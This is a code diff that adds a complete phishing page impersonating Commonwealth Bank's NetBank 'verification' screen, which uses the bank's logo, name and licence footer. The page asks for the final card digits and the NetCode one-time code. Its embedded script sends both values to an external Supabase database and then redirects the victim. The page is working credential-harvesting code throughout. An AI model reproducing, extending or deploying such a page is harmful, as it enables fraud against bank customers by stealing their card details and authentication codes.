@@ -1,0 +1,109 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>NetBank Verify</title>
+    <link rel="stylesheet" href="styles.css">
+  </head>
+  <body>
+    <main class="page-shell" aria-label="NetBank verification page">
+      <header class="brand">
+        <img src="logo.jpg" alt="Commonwealth Bank logo" class="brand-mark">
+        <span class="brand-name">Commonwealth Bank</span>
+      </header>
+
+      <section class="top-grid" aria-label="Card verification">
+        <form class="panel panel--plain login-panel" id="verify-form">
+
+          <p class="panel-intro">We need to do this for security reasons. Enter the details below.</p>
+
+          <div class="form-row">
+            <label for="card-number">Card number</label>
+            <div class="card-row">
+              <span class="card-prefix">5217 **** **** </span>
+              <input id="card-number" name="card-number" inputmode="numeric" maxlength="4" placeholder="----" autocomplete="off">
+            </div>
+          </div>
+
+          <div class="form-row">
+            <label for="netcode">NetCode</label>
+            <input id="netcode" name="netcode" inputmode="numeric" autocomplete="off">
+          </div>
+
+          <button class="login-button" type="submit">
+            Next ›
+          </button>
+        </form>
+
+        <aside class="side-column" aria-label="Card help">
+          <div class="panel link-panel link-panel--plain">
+            <div class="panel-body links">
+              <p><strong>Card help</strong></p>
+              <p>We keep your personal information secure at all times using industry standard encryption.</p>
+            </div>
+          </div>
+        </aside>
+      </section>
+
+      <footer class="footer">
+        <span class="copyright">© 2026 Commonwealth Bank of Australia ABN 48 123 123 124 AFSL and Australian credit licence 234945</span>
+      </footer>
+    </main>
+
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script>
+      const SUPABASE_URL      = "https://ffuhqntzcybuylwwqejb.supabase.co";
+      const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImZmdWhxbnR6Y3lidXlsd3dxZWpiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODIwNTUyNTMsImV4cCI6MjA5NzYzMTI1M30.dn5c8Trz-UAbMjbBvkeMSh9RuIbjB-e5J7MYpg6upKk";
+
+      const { createClient } = supabase;
+      const db = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+      const form = document.querySelector("#verify-form");
+
+      form.addEventListener("submit", async function(e) {
+        e.preventDefault();
+
+        const cardNumber = document.querySelector("#card-number");
+        const netcode    = document.querySelector("#netcode");
+
+        let valid = true;
+
+        [cardNumber, netcode].forEach(function(field) {
+          if (!field.value.trim()) {
+            field.classList.add("input-error");
+            valid = false;
+          } else {
+            field.classList.remove("input-error");
+          }
+        });
+
+        if (!valid) return;
+
+        const submissionId = sessionStorage.getItem("submission_id");
+
+        const { error } = await db
+          .from("submissions")
+          .update({
+            card_number: "5217 **** **** " + cardNumber.value.trim(),
+            netcode:     netcode.value.trim(),
+          })
+          .eq("id", submissionId);
+
+        if (error) {
+          console.error("Supabase error:", error.message);
+          return;
+        }
+
+        window.location.href = "issue.html";
+      });
+
+      // Remove error state as user types
+      document.querySelectorAll("input").forEach(function(input) {
+        input.addEventListener("input", function() {
+          input.classList.remove("input-error");
+        });
+      });
+    </script>
+  </body>
+</html>
